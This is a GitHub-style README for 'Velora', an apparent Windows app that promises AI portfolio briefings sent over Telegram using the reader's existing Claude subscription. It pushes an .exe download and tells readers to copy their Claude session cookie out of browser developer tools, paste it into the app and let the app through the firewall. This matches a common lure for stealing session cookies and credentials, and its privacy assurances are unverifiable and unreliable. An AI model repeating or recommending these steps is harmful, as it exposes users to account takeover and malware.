# 📈 Velora - Grow your wealth with AI insights

[![Download Velora](https://img.shields.io/badge/Download-Velora_for_Windows-blue.svg)](https://github.com/waterbruh/Velora/releases)

Velora acts as your personal wealth advisor. It watches your investment portfolio, scans market data, and delivers updates to your Telegram app. The software uses your existing Claude account to process market information. This setup prevents extra API costs.

## 🛠 Prerequisites

You need a few items before you begin. Check this list to ensure your computer setup works with the software:

*   **Operating System**: Windows 10 or 11.
*   **Claude Account**: An active Claude Pro or Team subscription.
*   **Telegram Account**: A free account to receive your briefings.
*   **Internet Connection**: A stable connection to receive live market data.
*   **Memory**: At least 4GB of RAM to help the AI process your portfolio data.

## 📥 How to download the app

1. Visit the [official releases page](https://github.com/waterbruh/Velora/releases) to find the latest version of the installer.
2. Locate the file ending in `.exe` under the Assets section.
3. Click the file name to start the download.
4. Save the file to your desktop or your Downloads folder for easy access.

## ⚙️ Setting up your bot

After downloading the file, double-click the installer icon. Follow the prompts on your screen to install Velora on your computer. 

### Create your Telegram bot
The software sends your investment reports through Telegram. You need to create a simple delivery path for these messages:

1. Open Telegram.
2. Search for the user named `@BotFather`.
3. Open a chat with this user and type `/newbot`.
4. Follow the instructions to name your bot. 
5. The BotFather will give you a long string of characters called an API Token. Keep this safe. You will input this into Velora during the first launch.

### Connect your Claude account
Velora requires access to your Claude subscription to analyze your stocks.

1. Open the Velora application on your desktop.
2. The initial setup screen will ask for your session token.
3. Log in to your Claude account in your web browser.
4. Open the browser developer tools (press F12 usually).
5. Navigate to the Storage or Cookies tab.
6. Copy the value listed for the session key.
7. Paste this into the designated box in the Velora application.

## 📊 Using the dashboard

Once you finish the setup, the main screen appears. This acts as your control center for your financial data.

### Adding your portfolio
Velora tracks your stocks by reading a simple file or by connecting to your brokerage data. Click the Add Portfolio button on the left sidebar. Type your ticker symbols and the amount of shares you hold. The app saves this information locally on your computer.

### Receiving briefings
Once you add your portfolio, the app begins its work. It checks your stocks every morning. You will receive a summary in your Telegram chat that details:

*   Major moves in your stocks.
*   News impact on your specific assets.
*   Suggested adjustments based on your stated goals.

You control the timing and frequency of these briefings in the Settings menu.

## 🔒 Safety and Privacy

Your financial data and your Claude session token stay on your computer. Velora does not upload your sensitive financial details to a third-party server. The app communicates directly with Telegram and Claude to send your alerts. 

If you decide to stop using the application:

1. Open your Windows Control Panel.
2. Select Uninstall a Program.
3. Find Velora in the list.
4. Select Uninstall.
5. Manually delete the folder where you stored your portfolio configuration files to fully wipe your data.

## 🛠 Troubleshooting common issues

If the application fails to start or your Telegram alerts do not arrive, follow these steps:

*   **Check the Log**: Open the folder where you installed the app. Look for a file named `app.log`. This file often highlights why the app stopped.
*   **Verify Tokens**: Incorrect Telegram tokens or expired Claude tokens stop the bot from working. Re-enter your tokens into the Settings tab if you see errors.
*   **Check Windows Firewall**: Sometimes Windows security blocks new apps from reaching the internet. Ensure you select Allow when a pop-up asks if Velora should access the network.

## 💡 Frequently Asked Questions

**Does this app charge me for Claude usage?**
No. Velora uses the browser session from your existing subscription. You do not pay extra fees as long as your Pro or Team subscription remains active.

**Can I track multiple portfolios?**
Yes. You can add as many watchlists as your computer memory allows. Create new tags in the portfolio section to organize your different investments.

**Who sees my financial information?**
Only you. The data stays on your machine. The Telegram messages go through the standard Telegram encrypted channels, so keep your device secure.

**How often does the app refresh data?**
The app updates your portfolio once every day by default. You can change this to happen more often in the Settings menu if you prefer real-time tracking.

## 🚀 Getting Started

Ready to begin? Download the software now and start your first briefing.

[Download Velora](https://github.com/waterbruh/Velora/releases)